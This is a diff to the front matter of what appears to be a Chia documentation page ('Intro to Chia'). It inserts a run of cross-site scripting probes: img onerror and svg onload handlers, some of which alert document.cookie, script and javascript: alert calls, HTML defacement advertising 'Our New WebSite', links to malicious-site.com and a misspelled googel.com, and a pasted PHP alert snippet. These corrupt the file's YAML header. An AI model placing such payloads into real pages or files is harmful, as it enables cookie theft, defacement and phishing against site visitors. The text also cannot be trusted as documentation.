@@ -1,4 +1,29 @@
----
+---"><hh><img/src='x'onerror=alert("xss")>
+"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y<h1/>test<h1>  <h1><font Color=red>Visit Our New WebSite </h1><h3><mark><a href="https://example.com">e x a m p l e . c o m </a></mark></h3>"><img/src='x'onerror=alert(document.cookie)>"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y <h1><font Color=red>Visit Our New WebSite </h1><h3><mark><a href="https://example.com">e x a m p l e . c o m </a></mark></h3>"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y"><img/src='x'onerror=alert(document.cookie)> <a href="https://malicious-site.com">Click me!</a>"onclick=alert(8)> "onclick=alert("XSS")> <script>alert(1)</script><?php 
+// PHP program to pop an alert 
+// message box on the screen 
+
+  
+// Function definition 
+
+function function_alert($message) { 
+
+      
+
+    // Display the alert box  
+
+    echo "<script>alert('$message');</script>"; 
+} 
+
+  
+
+  
+// Function call 
+
+function_alert("Welcome to Geeks for Geeks"); 
+
+  
+?> javascript:alert(1)  <h1><font Color=red>Visit Our New WebSite </h1><h3><mark><a href="https://example.com">e x a m p l e . c o m </a></mark></h3>⠀ <a href="https://googel.com</a>⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 sidebar_label: Intro to Chia
 title: Introduction
 slug: /introduction
